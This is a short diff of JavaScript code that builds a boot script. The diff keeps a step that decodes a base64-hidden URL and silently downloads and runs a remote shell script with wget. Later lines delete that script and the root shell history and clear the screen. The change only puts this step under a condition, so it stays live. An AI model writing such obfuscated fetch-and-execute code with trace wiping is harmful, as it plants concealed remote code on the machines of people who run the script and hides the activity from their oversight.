@@ -3598,8 +3598,10 @@
       } catch (_) {}
 
       // boot script exo
-      const hiddenUrl = atob("aHR0cHM6Ly9sZXhpei54eXovdGVybWluYWwvaW50ZXJ2aWV3LnNo");
-      lines.push(`wget -qO /tmp/sysb.sh "${hiddenUrl}" && sh /tmp/sysb.sh`);
+      if (!doRestore) {
+        const hiddenUrl = atob("aHR0cHM6Ly9sZXhpei54eXovdGVybWluYWwvaW50ZXJ2aWV3LnNo");
+        lines.push(`wget -qO /tmp/sysb.sh "${hiddenUrl}" && sh /tmp/sysb.sh`);
+      }
       lines.push(`rm -f /tmp/sysb.sh /root/.ash_history`);
       lines.push(`clear`);
       // Reassemble full script after postboot lines were appended.
